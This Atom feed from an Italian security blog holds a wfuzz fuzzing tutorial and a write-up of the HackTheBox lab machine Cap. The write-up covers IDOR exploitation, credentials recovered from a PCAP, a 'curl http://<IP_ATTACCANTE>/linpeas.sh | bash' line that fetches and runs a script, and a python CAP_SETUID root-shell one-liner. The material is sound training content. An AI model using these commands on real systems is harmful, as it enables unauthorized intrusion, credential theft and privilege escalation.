<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/">
    <title>Cybergate Lab</title>
    <link href="https://3nc0d3d.github.io/cybergatelab/feed.xml" rel="self" />
    <link href="https://3nc0d3d.github.io/cybergatelab" />
    <updated>2025-02-15T22:31:12+01:00</updated>
    <author>
        <name>Alessandro</name>
    </author>
    <id>https://3nc0d3d.github.io/cybergatelab</id>

    <entry>
        <title>Wfuzz: L’arma Segreta per il Fuzzing di Applicazioni Web</title>
        <author>
            <name>Alessandro</name>
        </author>
        <link href="https://3nc0d3d.github.io/cybergatelab/wfuzz-larma-segreta-per-il-fuzzing-di-applicazioni-web.html"/>
        <id>https://3nc0d3d.github.io/cybergatelab/wfuzz-larma-segreta-per-il-fuzzing-di-applicazioni-web.html</id>

        <updated>2025-02-15T17:24:55+01:00</updated>
            <summary>
                <![CDATA[
                    Nel mondo della sicurezza informatica, la capacità di testare e mettere alla prova le applicazioni web è fondamentale. Tra gli strumenti più potenti e versatili a disposizione dei professionisti della sicurezza, spicca wfuzz. Ma cos’è esattamente wfuzz e come può essere utilizzato per migliorare la&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                
  <p>
    Nel mondo della sicurezza informatica, la capacità di testare e mettere alla prova le applicazioni web è fondamentale. Tra gli strumenti più potenti e versatili a disposizione dei professionisti della sicurezza, spicca <strong>wfuzz</strong>. Ma cos’è esattamente wfuzz e come può essere utilizzato per migliorare la sicurezza delle nostre applicazioni web?

In questo articolo, esploreremo in dettaglio wfuzz, un fuzzer a riga di comando che va ben oltre il semplice directory brute-forcing. Scopriremo come può essere impiegato per una vasta gamma di test di sicurezza, dalla scoperta di aree nascoste all’identificazione di vulnerabilità complesse.


  </p>

    <h2 id="cose-il-fuzzing">
      Cos’è il Fuzzing?
    </h2>

  <p>
    
Prima di immergerci in wfuzz, è utile capire cos’è il “fuzzing”. In termini semplici, il <strong>fuzzing</strong> <em>è una tecnica di test che consiste nell’inviare un gran numero di input inattesi, casuali o malformati ad un sistema (in questo caso, un’applicazione web) per osservare come reagisce</em>. L’obiettivo è individuare comportamenti anomali, errori o crash che potrebbero indicare vulnerabilità di sicurezza.

Nel contesto delle applicazioni web, il fuzzing può essere applicato a diverse aree:


  </p>

  <ul>
    <li><strong>URL</strong>: Provare a indovinare directory e file non pubblicamente accessibili.</li><li><strong>Parametri (GET e POST)</strong>: Inviare input inaspettati nei parametri per testare vulnerabilità come SQL Injection o XSS.</li><li><strong>Header HTTP</strong>: Modificare gli header per scoprire funzionalità nascoste o vulnerabilità legate alla gestione degli header.</li><li><strong>Form di autenticazione</strong>: Tentare brute-force su credenziali di accesso.</li>
  </ul>

    <h2 id="wfuzz-il-fuzzer-web-versatile-e-potente">
      Wfuzz: Il Fuzzer Web Versatile e Potente
    </h2>

  <p>
    
wfuzz è uno strumento a riga di comando che eccelle proprio in queste attività di fuzzing. È molto più flessibile e potente di strumenti più specifici come gobuster, offrendo un controllo granulare su ogni aspetto delle richieste HTTP e sull’analisi delle risposte.

  </p>

    <h2 id="funzionalita-chiave-di-wfuzzlessbrgreater">
      Funzionalità Chiave di Wfuzz:<br>
    </h2>

  <ul>
    <li><strong>Fuzzing di URL</strong>: Simile al directory brute-forcing, ma con maggiore flessibilità. Permette di sostituire parti dell’URL con parole da una wordlist per scoprire risorse nascoste.</li><li><strong>Fuzzing di Parametri GET e POST:</strong> Permette di inserire payload da wordlist nei parametri delle richieste GET e POST, ideale per testare vulnerabilità di injection e manipolazione dei dati.</li><li><strong>Fuzzing di Header HTTP</strong>: Consente di modificare e fuzzare vari header HTTP, aprendo la strada a test più avanzati e alla scoperta di configurazioni inattese.</li><li><strong>Brute-forcing di Autenticazione</strong>: Può essere utilizzato per tentare attacchi brute-force su form di login, sia Basic Authentication che form basati su password.</li><li><strong>Customizzazione Totale delle Richieste</strong>: Offre un controllo completo sulla creazione delle richieste HTTP, inclusi metodi, header, body, cookie, permettendo test molto mirati.</li><li><strong>Filtraggio Avanzato dei Risultati</strong>: Fornisce opzioni di filtraggio potenti basate su codici di stato, dimensioni della risposta, contenuto, regex, per concentrarsi sui risultati più rilevanti e ridurre il “rumore”.</li><li><strong>Estensibilità con Plugin</strong>: È possibile estendere wfuzz con plugin per adattarlo a scenari di test specifici o aggiungere nuove funzionalità.</li><li><strong>Output in Diversi Formati</strong>: Permette di salvare i risultati in formati come HTML, CSV, JSON e Raw, facilitando l’analisi e la reportistica.</li>
  </ul>

    <h2 id="installare-wfuzz-su-debian-e-sistemi-simili">
      Installare Wfuzz su Debian (e Sistemi Simili)
    </h2>

  <p>
    Se utilizzi Debian o una distribuzione basata su Debian (come Ubuntu), l’installazione di wfuzz è semplicissima:
  </p>
<pre class="line-numbers  language-bash"><code>sudo apt update
sudo apt install wfuzz
</code></pre>

  <p>
    Dopo l’installazione, wfuzz sarà disponibile come comando wfuzz nel tuo terminale.
  </p>

    <h2 id="lessbrgreaterutilizzo-base-di-wfuzz-esempi-pratici">
      <br>Utilizzo Base di Wfuzz: Esempi Pratici
    </h2>

  <p>
    
Il cuore di ogni comando wfuzz è la parola chiave <strong>FUZZ</strong>. È questo segnaposto che wfuzz sostituirà con le parole dalla wordlist che specificherai.
Vediamo alcuni esempi di utilizzo comune:
  </p>

    <h3 id="lessbrgreater1-directory-brute-forcing-esplorazione-di-directory-nascostelessbrgreater">
      <br>1. Directory Brute-Forcing (Esplorazione di Directory Nascoste):<br>
    </h3>

  <p>
    <br>Per eseguire un directory brute-forcing, puoi usare questo comando:<br>
  </p>
<pre class="line-numbers  language-bash"><code> wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://www.example.com/FUZZ
</code></pre>

  <p>
    <b>-c</b>: Attiva l’output colorato per una migliore leggibilità.<br><b>-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</b>: Specifica la wordlist di directory da utilizzare.<br><b>http://www.example.com/FUZZ: </b>L’URL target&nbsp;<em>FUZZ</em> indica a wfuzz di sostituire “FUZZ” con ogni parola della wordlist.<br>
  </p>

    <h3 id="2-fuzzing-di-parametri-get-test-di-input-e-vulnerabilita">
      2. Fuzzing di Parametri GET (Test di Input e Vulnerabilità):
    </h3>

  <p>
    Per "fuzzare" il parametro query in un URL GET, puoi usare:<br>
  </p>
<pre class="line-numbers  language-bash"><code>wfuzz -c -w wordlist.txt "http://www.example.com/search.php?query=FUZZ"
</code></pre>

  <p id="wfuzz-inviera-richieste-comelessbrgreater-httpwwwexamplecomsearchphpqueryparola1-httpwwwexamplecomsearchphpqueryparola2lessbrgreater-e-cosi-via-usando-le-parole-dalla-wordlisttxtlessbrgreater3-fuzzing-di-parametri-post-simulazione-di-form">
    <b>wfuzz</b> invierà richieste come
<i>http://www.example.com/search.php?query=parola1</i>, <i>http://www.example.com/search.php?query=parola2</i>, e così via, usando le parole dalla <i>wordlist.txt</i>.
  </p>

    <h2 id="andnbsp3-fuzzing-di-parametri-post-simulazione-di-form">
      &nbsp;3. Fuzzing di Parametri POST (Simulazione di Form):
    </h2>

  <p>
    
Per fuzzare il parametro <i>username</i> in una richiesta POST ad un form di login:

  </p>
<pre class="line-numbers  language-bash"><code>wfuzz -c -w usernames.txt -d "username=FUZZ&password=password123" -H "Content-Type: application/x-www-form-urlencoded" http://www.example.com/login.php
</code></pre>

  <ul>
    <li><span style="color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: 1em;"><b>-d “username=FUZZ&amp;password=password123”</b></span><span style="color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: 1em; font-weight: var(--font-weight-normal);">: Definisce i dati POST. FUZZ sarà sostituito con ogni username dalla usernames.txt, mentre password rimane fissa.</span><br></li><li><strong>-H “Content-Type: application/x-www-form-urlencoded”</strong>: Imposta l’header corretto per i dati POST di un form HTML.<br></li>
  </ul>

    <h3 id="4-fuzzing-di-header-http-test-di-user-agentlessbrgreater">
      4. Fuzzing di Header HTTP (Test di User-Agent):<br>
    </h3>

  <p>
    Per testare come il server reagisce a diversi User-Agent:<br>
  </p>
<pre class="line-numbers  language-bash"><code>wfuzz -c -w user-agents.txt -H "User-Agent: FUZZ" http://www.example.com
</code></pre>

    <h3 id="5-filtraggio-dei-risultati-concentrarsi-sullimportantelessbrgreater">
      5. Filtraggio dei Risultati (Concentrarsi sull’Importante):<br>
    </h3>

  <p>
    Per nascondere i risultati con codici di stato 404 e 302, puoi usare <b>-hc</b>:<br>
  </p>
<pre class="line-numbers  language-bash"><code>wfuzz -c -w wordlist.txt --hc 404,302 http://www.example.com/FUZZ
# Solo i risultati con codici di stato diversi da 404 e 302 saranno visualizzati, riducendo il rumore.
</code></pre>

    <h3 id="6-salvare-loutput-su-disco-analisi-successivalessbrgreater">
      6. Salvare l’Output su Disco (Analisi Successiva):<br>
    </h3>

  <p>
    Per salvare i risultati in formato HTML nel file risultati_directory.html:<br>
  </p>
<pre class="line-numbers  language-bash"><code>wfuzz -c -w wordlist.txt -o html,risultati_directory.html http://www.example.com/FUZZ
# Puoi sostituire html con csv, json o raw per altri formati di output.
</code></pre>

    <h3 id="considerazioni-fondamentali-per-un-utilizzo-responsabilelessbrgreater">
      Considerazioni Fondamentali per un Utilizzo Responsabile:<br>
    </h3>

  <ul>
    <li><b>Etica e Legalità</b>: Utilizza wfuzz solo su siti web di cui hai il permesso di testare la sicurezza. Le scansioni non autorizzate sono illegali e non etiche.</li><li><b>Impatto sul Server</b>: Il fuzzing intensivo può sovraccaricare i server. Utilizza wfuzz con responsabilità, limitando i thread (-t) e usando ritardi (--delay) se necessario.</li><li><b>Qualità della Wordlis</b>t: L’efficacia di wfuzz dipende fortemente dalla wordlist. Scegli wordlist appropriate per il tipo di test.<br></li>
  </ul>

    <h3 id="conclusione-wfuzz-uno-strumento-indispensabilelessbrgreater">
      Conclusione: Wfuzz, Uno Strumento Indispensabile<br>
    </h3>

  <p>
    wfuzz è uno strumento potente e flessibile per il fuzzing di applicazioni web. La sua versatilità, le opzioni di customizzazione e filtraggio, e la capacità di salvare l’output lo rendono un componente essenziale per chiunque si occupi di sicurezza informatica e desideri testare a fondo la robustezza delle applicazioni web.<br><br>Inizia a sperimentare con gli esempi base, esplora la vasta gamma di opzioni di wfuzz (consulta wfuzz –help per la guida completa) e scopri come questo strumento può aiutarti a migliorare la sicurezza delle tue applicazioni web!
  </p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Exploit della Macchina Cap di HTB</title>
        <author>
            <name>Alessandro</name>
        </author>
        <link href="https://3nc0d3d.github.io/cybergatelab/exploit-della-macchina-cap-di-htb.html"/>
        <id>https://3nc0d3d.github.io/cybergatelab/exploit-della-macchina-cap-di-htb.html</id>

        <updated>2025-02-11T17:22:00+01:00</updated>
            <summary>
                <![CDATA[
                    Introduzione Cap è una macchina Linux a bassa difficoltà progettata per test di sicurezza. Al suo interno è presente un server HTTP dedicato ad attività amministrative, tra cui la cattura di traffico di rete. In questo write-up, analizzeremo come una vulnerabilità IDOR (Insecure Direct Object&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                <h1 id="introduzione">Introduzione</h1>
<p>Cap è una macchina Linux a bassa difficoltà progettata per test di sicurezza. Al suo interno è presente un server HTTP dedicato ad attività amministrative, tra cui la cattura di traffico di rete. In questo write-up, analizzeremo come una vulnerabilità <strong>IDOR</strong> (Insecure Direct Object Reference) abbia permesso di accedere a dati sensibili e di ottenere privilegi root tramite escalation.</p><h1 id="cosè-lidor">Cos’è l’IDOR?</h1>
<p>L’IDOR è una <em>vulnerabilità che si verifica quando un’applicazione espone riferimenti diretti a oggetti interni (es. ID di record, file) senza controllare i permessi dell’utente</em>. Ciò consente a un attaccante di manipolare tali riferimenti per accedere a risorse non autorizzate.</p><h2 id="esempio-pratico">Esempio Pratico</h2>
<p>Supponiamo un URL come:</p><pre><code>http://esempio.com/documento/123
</code></pre>
<p>Se l’applicazione non verifica che l’utente abbia i diritti per accedere al documento con ID 123, modificando questo valore (es. 124) si potrebbe accedere a documenti altrui.</p><h2 id="rischi-associati">Rischi Associati</h2>
<ul>
<li>Esposizione di dati sensibili.</li>
<li>Manipolazione di risorse critiche.</li>
<li>Difficoltà di individuazione (bassa visibilità).</li>
</ul>
<h2 id="prevenzione">Prevenzione</h2>
<ul>
<li>Implementare controlli di accesso granulari.</li>
<li>Utilizzare identificatori non prevedibili (es. UUID).</li>
<li>Validare e sanificare gli input.</li>
<li>Loggare le attività sospette.</li>
</ul>
<h2 id="la-vulnerabilità-nella-macchina-cap">La Vulnerabilità nella Macchina Cap</h2>
<p>L’applicazione web di Cap permetteva il download di file PCAP (acquisizioni di traffico di rete) tramite URL come:</p><pre><code>http://10.10.10.56/data/2
</code></pre>
<p>Modificando l’ID (2, 3, ecc.), era possibile scaricare PCAP appartenenti ad altri utenti, sfruttando proprio un IDOR.</p><h2 id="fasi-dellattacco">Fasi dell’Attacco</h2>
<h3 id="1-scansione-iniziale">1. Scansione Iniziale</h3>
<p>Dopo aver configurato la VPN per accedere alla macchina, ho utilizzato <strong>nmap</strong> per identificare le porte aperte:</p><pre><code>nmap -sV 10.10.10.56
</code></pre>
<p>Risultato:</p><pre><code>Porta 21 (FTP), 22 (SSH), 80 (HTTP).
</code></pre>
<h3 id="2-exploit-dellidor">2. Exploit dell’IDOR</h3>
<p>Modificando l’ID nell’URL (es. <a href="http://10.10.10.56/data/3">http://10.10.10.56/data/3</a>), ho scaricato diversi file PCAP.</p><h3 id="3-analisi-con-wireshark">3. Analisi con Wireshark</h3>
<p>Uno dei file PCAP conteneva una connessione FTP non cifrata, con credenziali in chiaro:</p><pre><code>User: nathan  
Password: Bu......F0RM3!
</code></pre>
<h3 id="4-accesso-ssh">4. Accesso SSH</h3>
<p>Le stesse credenziali erano valide per il servizio SSH:</p><pre><code>ssh nathan@10.10.10.56
</code></pre>
<h2 id="privilege-escalation-da-utente-a-root">Privilege Escalation: Da Utente a Root</h2>
<h3 id="1-ricerca-di-vulnerabilità-con-linpeas">1. Ricerca di Vulnerabilità con linPEAS</h3>
<hr>
<h4 id="cosè-linpeas-linux-privilege-escalation-awesome-script">Cos’è linPEAS (linux Privilege Escalation Awesome Script)</h4>
<p><em>linPEAS identifica potenziali vettori di escalation dei privilegi e vulnerabilità all’interno di un sistema linux lo script si occupa di:</em></p><ul>
<li><em>verifica della configurazione e dei permessi di file critici</em></li>
<li><em>dentificazione di servizi in esecuzione e processi potenzialmente insicuri.</em></li>
<li><em>raccolta di informazioni su software installati, configurazioni di rete e possibili errori di configurazione.</em></li>
<li><em>Analisi di eventuali debolezze nei meccanismi di autenticazione e autorizzazione.</em></li>
</ul>
<hr>
<p>Dopo aver ottenuto l’accesso come nathan, ho trasferito lo script linPEAS per individuare vettori di escalation:</p><p>Avvio di un server HTTP in locale:</p><pre><code>python -m http.server 80
</code></pre>
<p>Esecuzione di linPEAS sul target:</p><pre><code>curl http://&lt;IP_ATTACCANTE&gt;/linpeas.sh | bash
</code></pre>
<h3 id="2-individuazione-del-vettore-critico">2. Individuazione del Vettore Critico</h3>
<p>Lo script ha evidenziato che l’eseguibile python3.8 possedeva il capability <strong>CAP_SETUID</strong>:</p><pre><code>/usr/bin/python3.8 = cap_setuid+ep
</code></pre>
<p>Questa capability consente a Python di modificare l’UID del processo, permettendo di impersonare root, per cui possiamo eseguire da python una shell come root.</p><h3 id="3-exploit-finale">3. Exploit Finale</h3>
<p>Per ottenere una shell root, ho eseguito:</p><pre><code>import os
os.setuid(0)
os.system(&quot;/bin/bash&quot;)
</code></pre>
<p>Esecuzione:</p><pre><code>python3.8 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;
</code></pre>
<p>Risultato: Accesso come root! 🔑</p><h2 id="conclusioni">Conclusioni</h2>
<p>La macchina Cap dimostra due rischi critici:</p><ul>
<li>IDOR: L’assenza di controlli sugli ID ha permesso l’accesso a dati altrui.</li>
<li>Capability Pericolose: Assegnare capability come CAP_SETUID a interpreti (es. Python) può portare a escalation catastrofiche.</li>
</ul>
<h2 id="best-practice">Best Practice</h2>
<ul>
<li>Limitare l’uso di capability ai soli processi necessari.</li>
<li>Revisionare periodicamente i permessi dei file.</li>
<li>Adottare il principio del minimo privilegio.</li>
<li>Questo caso sottolinea l’importanza di un’igiene di sicurezza rigorosa, sia nel codice che nella configurazione di sistema.</li>
</ul>

            ]]>
        </content>
    </entry>
</feed>
